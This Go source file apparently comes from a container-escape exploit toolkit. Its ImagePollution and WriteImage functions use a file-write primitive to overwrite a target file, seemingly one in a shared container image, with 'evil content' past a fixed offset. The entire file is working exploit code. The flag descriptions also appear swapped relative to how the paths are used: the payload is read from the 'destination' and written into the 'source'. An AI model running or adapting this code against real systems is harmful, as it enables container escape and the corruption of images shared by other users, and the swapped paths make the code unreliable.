package pipe_primitive

import (
	"bytes"
	"flag"
	"fmt"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"os"
)

func ImagePollution(primitive Primitive) (err error) {
	flagSet := flag.NewFlagSet(imagePollutionExpName(primitive), flag.ContinueOnError)
	var source, dest string
	flagSet.StringVar(&source, "source", "", "the path of file with evil content")
	flagSet.StringVar(&dest, "destination", "", "the path of file you want to pollution")
	awesome_error.CheckFatal(flagSet.Parse(os.Args[1:]))
	payload, err := os.ReadFile(dest)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return WriteImage(primitive, source, payload)
}

func WriteImage(primitive Primitive, path string, payload []byte) (err error) {
	minOffset := primitive.MinOffset()
	content, err := os.ReadFile(path)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	if int64(len(payload)) < minOffset {
		err = fmt.Errorf("len(payload)=%d < minOffset=%d", len(payload), minOffset)
		awesome_error.CheckErr(err)
		return
	}
	if int64(len(content)) < minOffset {
		err = fmt.Errorf("len(content)=%d < minOffset=%d", len(content), minOffset)
		awesome_error.CheckErr(err)
		return
	}
	if bytes.Compare(content[:minOffset], payload[:minOffset]) != 0 {
		err = fmt.Errorf(
			"the first %d bytes are %+v != %+v, cannot escape by this exp",
			minOffset, content[:minOffset], payload[:minOffset],
		)
		awesome_error.CheckErr(err)
		return
	}
	err = primitive.Write(path, minOffset, payload[minOffset:])
	if err != nil {
		return
	}
	return
}
